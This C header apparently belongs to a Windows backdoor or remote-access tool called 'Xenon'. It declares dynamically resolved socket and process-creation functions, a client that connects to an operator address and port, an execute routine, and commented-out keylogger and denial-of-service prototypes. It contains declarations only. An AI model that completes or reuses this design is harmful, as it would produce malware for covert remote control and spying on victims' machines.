#ifndef CXENONh_H
#define CXENONh_H

#include "../../../Include/driver/socket.h"
#include "../../../Injector/Dependencies/parse/parse.h"

#define Exit -2
#define UNKNOWN 2

#if defined(_WIN32)


int WININIT(void);
//      char* keylogger(void);
//      void DOS(void);


struct functionaddr
{
    
    SOCKET (*function_socket)(int, int, int);
    int* (*function_connect)(SOCKET, const struct sockaddr*, int);
    int* (*function_WSAcleanup)(void);
    int* (*function_WSAstartup)(WORD, LPWSADATA);
    BOOL* (*function_process)(LPCSTR,
                            LPSTR,
                            LPSECURITY_ATTRIBUTES,
                            LPSECURITY_ATTRIBUTES,
                            BOOL,
                            DWORD,
                            LPVOID,
                            LPCSTR,
                            LPSTARTUPINFOA,
                            LPPROCESS_INFORMATION
                            );
    
    
    
};

enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,

};

typedef struct
{

	int dstport;
	char* dstaddr;

} ClientCTX, *pClientCTX;


struct functionaddr GetFunctionVA(struct functionaddr* funcVA);
pClientCTX CliInit(const char* inetaddr, const int port);
SOCKET client_socket(SOCKET Socket);
SOCKET client_conn(SOCKET Socket, pClientCTX CTX);
int execute(const char* process);

#endif
#endif